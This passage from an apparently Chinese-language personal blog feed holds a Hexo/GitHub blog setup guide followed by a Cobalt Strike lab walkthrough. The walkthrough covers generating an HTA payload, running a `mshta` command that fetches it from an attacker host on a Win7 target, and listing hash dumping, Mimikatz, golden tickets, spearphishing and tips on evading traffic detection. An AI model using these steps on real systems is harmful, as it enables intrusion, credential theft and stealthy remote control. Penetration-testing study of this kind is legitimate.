class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure><h4 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h4><p>blog目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g#生成静态页面</span><br><span class="line">hexo s#启动本地预览服务</span><br></pre></td></tr></table></figure><p>执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器访问http:&#x2F;&#x2F;127.0.0.1:4000，即可看到hexo默认生成页面hello,world</span><br></pre></td></tr></table></figure><h2 id="上传GitHub的配置"><a href="#上传GitHub的配置" class="headerlink" title="上传GitHub的配置"></a>上传GitHub的配置</h2><p>配置站点配置文件_config.yml中的deploy部分:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>安装上传插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>上传命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>在hexo根目录下，会将有所改动的内容全部提交至github</p><h2 id="更改Hexo主题及优化"><a href="#更改Hexo主题及优化" class="headerlink" title="更改Hexo主题及优化"></a>更改Hexo主题及优化</h2><h4 id="hexo目录结构"><a href="#hexo目录结构" class="headerlink" title="hexo目录结构"></a>hexo目录结构</h4><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/image-20200703214804373.png" alt="image-20200703214804373"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">deploy：执行hexo deploy命令部署到GitHub上的内容目录;</span><br><span class="line"></span><br><span class="line">public：执行hexo generate命令，输出的静态网页内容目录;</span><br><span class="line"></span><br><span class="line">scaffolds：layout模板文件目录，其中的md文件可以添加编辑;</span><br><span class="line"></span><br><span class="line">scripts：扩展脚本目录，这里可以自定义一些javascript脚本;</span><br><span class="line"></span><br><span class="line">source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里;</span><br><span class="line"></span><br><span class="line">drafts：草稿文章;</span><br><span class="line"></span><br><span class="line">posts：发布文章;</span><br><span class="line"></span><br><span class="line">themes：主题文件目录;</span><br><span class="line"></span><br><span class="line">_config.yml：全局配置文件，大多数的设置都在这里;</span><br><span class="line"></span><br><span class="line">package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮;</span><br></pre></td></tr></table></figure><h4 id="next主题目录结构"><a href="#next主题目录结构" class="headerlink" title="next主题目录结构"></a>next主题目录结构</h4><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/image-20200703215229186.png" alt="image-20200703215229186"></p><h4 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h4><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure><p>执行完成后会在blog\themes\目录下生成next目录。</p><p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，称为主题配置文件。</p><h4 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h4><p>配置站点配置文件，寻找theme字段，将其值修改为next（next前后都有一个空格，否则会报错）。</p><h4 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#清除缓存</span><br><span class="line">hexo g#重新生成代码</span><br><span class="line">hexo s#部署到本地</span><br><span class="line"></span><br><span class="line">浏览器访问http:&#x2F;&#x2F;127.0.0.1:4000查看效果</span><br></pre></td></tr></table></figure><h4 id="主题简单优化"><a href="#主题简单优化" class="headerlink" title="主题简单优化"></a>主题简单优化</h4><h5 id="设置布局："><a href="#设置布局：" class="headerlink" title="设置布局："></a>设置布局：</h5><p>主题配置文件中，寻找Scheme字段，next提供三种默认主题布局，将你想使用的布局取消注释即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#scheme: Muse   </span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><p>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白;</p><p>Mist - Muse 的紧凑版本，整洁有序的单栏外观;</p><p>Pisces - 双栏 Scheme，小家碧玉似的清新.</p><h5 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h5><p>站点配置文件中，寻找language 字段，设置其值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure><p>语言文件位于hexo\themes\next\languages目录下</p><h5 id="设置侧边栏"><a href="#设置侧边栏" class="headerlink" title="设置侧边栏"></a>设置侧边栏</h5><p>主题配置文件中，设置侧边栏在左侧或右侧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sidebar:</span><br><span class="line">  # Sidebar Position, available value: left | right (only for Pisces | Gemini).</span><br><span class="line">  position: left</span><br><span class="line">  #position: right</span><br></pre></td></tr></table></figure><p>设置侧边栏显示时机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post - 默认行为，在文章页面（拥有目录列表）时显示</span><br><span class="line">always - 在所有页面中都显示</span><br><span class="line">hide - 在所有页面中都隐藏（可以手动展开）</span><br><span class="line">remove - 完全移除</span><br></pre></td></tr></table></figure><h4 id="设置主题菜单"><a href="#设置主题菜单" class="headerlink" title="设置主题菜单"></a>设置主题菜单</h4><p>主题配置文件中，寻找menu字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: &#x2F;#主页</span><br><span class="line">  #archives: &#x2F;archives#归档页</span><br><span class="line">  about: &#x2F;about#关于页</span><br><span class="line">  #categories: &#x2F;categories#分类页</span><br><span class="line">  tags: &#x2F;tags#标签页</span><br><span class="line">  #commonweal: &#x2F;404.html#公益404</span><br></pre></td></tr></table></figure><p>除主页与归档页外，其余页面需要手动创建。每行中||后的内容为指定此menu的图标</p><h5 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h5><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\tags目录中生成index.md文件。</p><p>修改此index.md文件为(添加type行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>对于blog\source_post目录下具体博客文章设置tags(设置tags行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h5 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h5><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>命令执行后，blog\source\categories目录中生成index.md文件。</p><p>修改此index.md文件为(添加categories行)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>对于blog\source_post目录下具体博客文章设置categories(设置categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h5 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h5><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\about目录中生成index.md文件。</p><p>修改index.md文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">---</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure><h5 id="首页文章只显示一部分"><a href="#首页文章只显示一部分" class="headerlink" title="首页文章只显示一部分"></a>首页文章只显示一部分</h5><p>在博客文章适当位置添加<!--more--> 标记即可</p><h5 id="博客中添加视频"><a href="#博客中添加视频" class="headerlink" title="博客中添加视频"></a>博客中添加视频</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe </span><br><span class="line">height&#x3D;500 width&#x3D;100% </span><br><span class="line">src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx&quot; </span><br><span class="line">frameborder&#x3D;0 allowfullscreen&gt;</span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><h2 id="markdown本地图片问题"><a href="#markdown本地图片问题" class="headerlink" title="markdown本地图片问题"></a>markdown本地图片问题</h2><h4 id="开启-post-asset-folder"><a href="#开启-post-asset-folder" class="headerlink" title="开启 post_asset_folder"></a>开启 post_asset_folder</h4><p>在站点配置文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><h4 id="安装-hexo-asset-image-插件"><a href="#安装-hexo-asset-image-插件" class="headerlink" title="安装 hexo-asset-image 插件"></a>安装 hexo-asset-image 插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image --save</span><br></pre></td></tr></table></figure><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>1、在与 _posts/my_article.md的平级位置上创建文件夹 my_article；<br>2、放置 my_article.md 文件中引用到的图片，例如 my_pic.jpg；<br>3、在 my_article.md 以 <img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/my_pic.jpg" alt="my_pic"> 方式引用。</p><h4 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post 测试文章</span><br></pre></td></tr></table></figure><p>执行命令后会在blog/source/_post目录下生成<code>测试文章</code>.md，已经<code>测试文章</code>文件夹。</p><p>其中<code>测试文章</code>文件夹中存放markdown中使用的图片，具体方法为</p><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/pic.png" alt>  //此处为测试文章文件夹</p><h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot;#新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;#新建页面</span><br><span class="line">hexo generate#生成静态页面至public目录</span><br><span class="line">hexo server#开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）</span><br><span class="line">hexo deploy#部署到GitHub</span><br><span class="line">hexo help#查看帮助</span><br><span class="line">hexo version#查看Hexo的版本</span><br><span class="line">hexo clean#清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n &#x3D;&#x3D; hexo new</span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate</span><br><span class="line">hexo s &#x3D;&#x3D; hexo server</span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g#生成并本地预览</span><br><span class="line">hexo d -g#生成并上传</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="博客" scheme="http://yoursite.com/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客搭建" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>Cobaltstrike</title>
    <link href="http://yoursite.com/2020/07/03/Cobaltstrike/"/>
    <id>http://yoursite.com/2020/07/03/Cobaltstrike/</id>
    <published>2020-07-03T08:15:29.000Z</published>
    <updated>2020-07-03T15:45:03.331Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><h2 id="CobaltStrike基础"><a href="#CobaltStrike基础" class="headerlink" title="CobaltStrike基础"></a>CobaltStrike基础</h2><h4 id="关于CobaltStrike"><a href="#关于CobaltStrike" class="headerlink" title="关于CobaltStrike"></a>关于CobaltStrike</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</span><br><span class="line">CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure><p>Cobaltstrike可自定义的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cobalt Strike可以使用 AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等。</span><br><span class="line">Cobalt Strike通信配置文件是 Malleable C2，可以修改CS的通讯特征，Beacon payload的一些行为。</span><br><span class="line">Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</span><br></pre></td></tr></table></figure><h4 id="Cobaltstrike目录"><a href="#Cobaltstrike目录" class="headerlink" title="Cobaltstrike目录"></a>Cobaltstrike目录</h4><p>目录：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200623222055788.png" alt="image-20200623222055788.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">agscript 拓展应用的脚本</span><br><span class="line">c2lint 用于检查profile的错误异常</span><br><span class="line">teamserver 服务端程序</span><br><span class="line">cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</span><br><span class="line">logs 目录记录与目标主机的相关信息</span><br><span class="line">update，update.jar用于更新CS</span><br><span class="line">third-party 第三方工具</span><br><span class="line">start.sh 客户端启动脚本</span><br></pre></td></tr></table></figure><p> 最核心的就是teamserver和cobaltstrike.jar，分别是服务端和客户端。</p><h4 id="使用Cobaltstrike"><a href="#使用Cobaltstrike" class="headerlink" title="使用Cobaltstrike"></a>使用Cobaltstrike</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.首先给teamserver权限：</span><br><span class="line">chmod 777 teamserver</span><br><span class="line">2.启动，第一个参数是地址，第二个参数是密码，地址是服务端的地址，密码任意设置。</span><br><span class="line"> .&#x2F;teamserver xx.xxx.xx.x password</span><br><span class="line">3.打开客户端</span><br><span class="line"> .&#x2F;start.sh</span><br></pre></td></tr></table></figure><p>启动后界面如图：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200623215837657.png" alt="image-20200623215837657.png"></p><p>此处的端口默认为50050，如果更改了teamserver文件里的server_port值那么在此处就需要改成对应的。</p><p>连接进去后：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200623222213228.png" alt></p><p><strong>先简单走一遍木马上线</strong></p><p>首先创建一个listener，左上角cobaltstrike–&gt;listeners</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202233213.png" alt="image-20200624202233213"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202329852.png" alt="image-20200624202329852"></p><p>payload主要分为beacon和foreign两大类。Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、SMB。</p><p>Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202551269.png" alt="image-20200624202551269"></p><p>下面选择攻击途径，选中html application，采用html应用的途径攻击。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202658222.png" alt></p><p>选择方法，分别是可执行文件，powershell，vb程序，这里选择powershell</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202751335.png" alt="image-20200624202751335"></p><p>点击generate生成，选择存放路径</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202903898.png" alt="image-20200624202903898"></p><p>然后利用web服务，打开通道</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203106791.png" alt="image-20200624203106791"></p><p>在file一行选中前面生成的hta文件的路径。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203225279.png" alt="image-20200624203225279"></p><p>点击launch即可生成链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.12.135:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure><p> 这条链接就是用于执行本次攻击.</p><p>打开win7靶机，打开cmd，执行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;172.16.12.135:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure><p>此时回到kali中，可以看到靶机已经上线</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203653055.png" alt="image-20200624203653055"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203741794.png" alt="image-20200624203741794"></p><p>在eventlog中可以看到相关日志</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203825761.png" alt="image-20200624203825761"></p><p>选中这条记录，右键点击interact，即可与靶机进行交互</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204002558.png" alt="image-20200624204002558"></p><p>进行shell交互，只需要输入shell “命令”即可</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204452497.png" alt></p><h4 id="各个模块简介"><a href="#各个模块简介" class="headerlink" title="各个模块简介"></a>各个模块简介</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624204709917.png" alt="image-20200624204709917"></p><p>new connection 新建立一个用户连接，即连接到一个新的teamserver上。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204828986.png" alt></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204845245.png" alt></p><p>  Preferences 配置自己的设置。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205135146.png" alt></p><p>Visualization可视化。</p><p> pivot graph：控制主机视图 </p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205312828.png" alt></p><p> session table ：会话视图</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205350008.png" alt="image-20200624205350008"></p><p> Target table：目标表</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205427113.png" alt="image-20200624205427113"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205623348.png" alt="image-20200624205623348"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vpn lnterfaces ：vpn接口，一般在公网环境下很实用</span><br><span class="line">listeners ：建立个反弹shell的监听器</span><br><span class="line">Script manager 用于脚本管理，CS可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span><br></pre></td></tr></table></figure><p>创建listener之后，是选择攻击方式：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205925400.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTML Application：生成hta文件</span><br><span class="line">MS Office Macro：宏office文件</span><br><span class="line">Payload Generator：生成各种语言版本的payload</span><br><span class="line">Windows Executable payload：生成可执行文件 (一般使用这个)</span><br><span class="line">Windows Executable (S)：把包含payload,Stageless生成可执行文件</span><br></pre></td></tr></table></figure><p>生成文件之后就是该投递文件了，也就是创建一个渠道，能够让靶机下载执行生成的恶意文件。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624210350484.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CS支持的方式包括：</span><br><span class="line">Manage 开启的所有web服务</span><br><span class="line">Clone site 克隆网站</span><br><span class="line">Host File 提供Web以供下载某文件</span><br><span class="line">Scripted Web Delivery 为payload提供web服务以便于下载和执行</span><br><span class="line">Signed Applet Attack 启动一个Web服务以提供自签名JavaApplet的运行环境</span><br><span class="line">Smart Applet Attack 自动检测Java版本并利用已知的exploits绕过security</span><br><span class="line">System Profiler 获取系统，Flash，浏览器版本等</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624210729697.png" alt></p><p>第三个菜单是SpearPhish，即鱼叉式网络钓鱼。</p><p>在以上线主机会话，右键interact可以开启beacon，可以用它来执行各种命令</p><p>在Cobalt Strike中它的心跳默认是60s，默认60s一次回传，这会让我们执行的命令响应很慢，在下载文件面前更为明显，所以实验时会把时间降低一点。但是在实战时应根据实战环境来调节，建议不要太快，不然流量特征会过于明显，容易暴露自己。</p><p>设置为如下，让靶机每5s下载一次任务：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624211057336.png" alt="image-20200624211057336"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624211142583.png" alt="image-20200624211142583"></p><p>会话右键的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Interact 打开beacon</span><br></pre></td></tr></table></figure><p>Access：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dumphashes 获取hash</span><br><span class="line">Elevate 提权</span><br><span class="line">GoldenTicket 生成黄金票据注入当前会话</span><br><span class="line">MAketoken  凭证转换</span><br><span class="line">RunMimikatz  运行Mimikatz</span><br><span class="line">SpawnAs 用其他用户生成CobaltStrike侦听器</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624212142221.png" alt></p><p>Explore:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BrowserPivot 劫持目标浏览器进程</span><br><span class="line">Desktop(VNC)  桌面交互</span><br><span class="line">FileBrowser  文件浏览器</span><br><span class="line">NetView 命令Net View</span><br><span class="line">Portscan 端口扫描</span><br><span class="line">Processlist 进程列表</span><br><span class="line">screenshot 截屏</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624212401816.png" alt></p><p>Pivoting：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCKS Server 代理服务</span><br><span class="line">Listener  反向端口转发</span><br><span class="line">DeployVPN 部署VPN</span><br></pre></td></tr></table></figure><p>Spawn 派生新的通讯模式并生成会话</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624212548018.png" 